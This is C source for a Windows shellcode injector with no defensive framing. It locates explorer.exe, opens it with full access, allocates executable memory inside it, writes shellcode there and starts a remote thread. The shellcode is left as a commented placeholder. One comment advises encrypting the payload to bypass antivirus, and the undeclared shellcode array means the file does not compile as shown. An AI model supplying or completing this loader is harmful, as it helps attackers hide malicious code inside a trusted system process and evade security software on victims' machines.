#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>


//
// SHELLCODE HERE
//
// unsigned char* Shellcode[] =
//


// REFER TO PAYLOAD ENCRYPT/DECRYPT TO BYPASS AV


DWORD FindProcessId(const wchar_t* processName) {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, processName) == 0) {
                    processId = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return processId;
}

BOOL InjectShellcode(DWORD processId, const unsigned char* Shellcode, SIZE_T ShellcodeSize) {

    // 2 OPEN HANDLE TO PROCESS
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);

    // 3 ALLOCATE MEMORY
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 4 WRITE SHELLCODE TO ALLOCATED MEMORY
    WriteProcessMemory(hProcess, pRemoteCode, Shellcode, ShellcodeSize, NULL);

    // 5 CREATE REMOTE THREAD WITH NEW MEMORY
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);

    // 6 KEEP THREAD OPEN< CONTINUE EXECUTION
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

int main() {

    const wchar_t* targetProcessName = L"explorer.exe";

    // 1 FIND PROCESS ID
    DWORD pid = FindProcessId(targetProcessName);

    InjectShellcode(pid, Shellcode, sizeof(Shellcode));

    return 0;
}
